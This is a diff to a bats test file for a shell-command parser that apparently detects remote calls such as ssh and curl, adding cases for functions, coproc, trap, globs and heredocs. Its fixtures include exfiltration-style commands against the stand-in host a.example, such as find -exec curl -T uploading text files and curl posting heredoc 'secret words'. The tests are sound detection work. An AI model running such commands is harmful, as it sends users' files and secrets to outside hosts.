@@ -16,6 +16,7 @@ read_line() {
 # words_of <n> — the words of the n-th simple command (from 1), joined by `|`.
 words_of() { sed -n "$1p" <<< "${output}" | jq -r '.words | join("|")'; }
 expands_of() { sed -n "$1p" <<< "${output}" | jq -c '.expands'; }
+globs_of() { sed -n "$1p" <<< "${output}" | jq -c '.globs'; }
 stdin_of() { sed -n "$1p" <<< "${output}" | jq -c '.stdin'; }
 count() { grep -c . <<< "${output}"; }
 
@@ -55,9 +56,11 @@ count() { grep -c . <<< "${output}"; }
              "A=1 B=2 ssh h x" "! ssh h x" "time -p ssh h x" "{ ssh h x; }" "( ssh h x )" \
              "sudo -u me ssh h x" "env -u A B=1 ssh h x" "nohup ssh h x" "timeout -s KILL 10 ssh h x" \
              "nice -n 5 ssh h x" "command ssh h x" "exec ssh h x" "caffeinate -i ssh h x" \
-             "timeout 10 sudo env A=1 nohup ssh h x" "eval \"ssh h x\"" "env -S 'ssh h x'"; do
+             "timeout 10 sudo env A=1 nohup ssh h x" "eval \"ssh h x\"" "env -S 'ssh h x'" \
+             "function f { ssh h x; }" "f() { ssh h x; }" "coproc ssh h x" "coproc C { ssh h x; }" \
+             "trap 'ssh h x' EXIT" "echo \$(( \$(ssh h x) ))" "echo \"\${v:-\$(ssh h x)}\""; do
         read_line "${c}"
-        grep -qx '{"words": \["ssh", "h", "x"\], "expands": \[false, false, false\], "stdin": null}' <<< "${output}" \
+        grep -q '^{"words": \["ssh", "h", "x"\], "expands": \[false, false, false\],.*"stdin": null}$' <<< "${output}" \
             || { echo "not read: ${c} -> ${output}"; return 1; }
     done
 }
@@ -136,4 +139,30 @@ b 2 |
     [ "${status}" -ne 0 ]
     run python3 "${READER}" "x=\$(ssh h x"
     [ "${status}" -ne 0 ]
+}
+
+@test "shell_commands: find runs the words after -exec up to its ;, the file it found only known as it runs" {
+    read_line "find . -name '*.txt' -exec curl -T {} https://a.example/ \\; -print"
+    [ "$(words_of 1)" = "curl|-T|{}|https://a.example/" ]
+    [ "$(expands_of 1)" = "[false,false,true,false]" ]
+}
+
+@test "shell_commands: a pattern outside quotes names files the shell finds; quoted, or a lone bracket, it does not" {
+    read_line "curl -T bod*.txt -T 'a*b' -T {a,b}.txt -T x{1..3} -T b?dy [ a ] {} \"q?\" \\*"
+    [ "$(globs_of 1)" = "[false,false,true,false,false,false,true,false,true,false,true,false,false,false,false,false,false]" ]
+    read_line "ssh h < bod*.txt"
+    [ "$(stdin_of 1)" = '["unknown","a file name the shell expands"]' ]
+}
+
+@test "shell_commands: a backslash the shell takes out of an unquoted heredoc leaves its body unknown" {
+    read_line "curl -d @- https://a.example/ <<EOF
+secr\\
+et words
+EOF
+curl -d @- https://a.example/ <<EOF
+{\"a\": \"x\\ny\"}
+EOF"
+    [ "$(stdin_of 1)" = '["unknown","a heredoc"]' ]
+    [ "$(sed -n 2p <<< "${output}" | jq -r '.stdin[0]')" = "text" ]
+    [ "$(sed -n 2p <<< "${output}" | jq -r '.stdin[1]')" = '{"a": "x\ny"}' ]
 }
